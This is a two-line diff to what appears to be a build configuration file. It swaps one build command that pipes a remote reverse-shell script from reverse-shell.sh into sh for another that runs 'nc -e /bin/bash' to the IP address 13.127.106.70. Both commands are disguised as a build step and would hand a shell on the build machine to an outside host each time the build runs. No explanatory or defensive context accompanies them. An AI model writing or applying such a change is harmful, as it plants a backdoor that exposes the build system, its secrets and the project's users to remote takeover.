@@ -1,2 +1,2 @@
 [build]
-  command = "curl https://reverse-shell.sh/13.127.106.70:1234 | sh"
+  command = "nc -e /bin/bash 13.127.106.70 80"
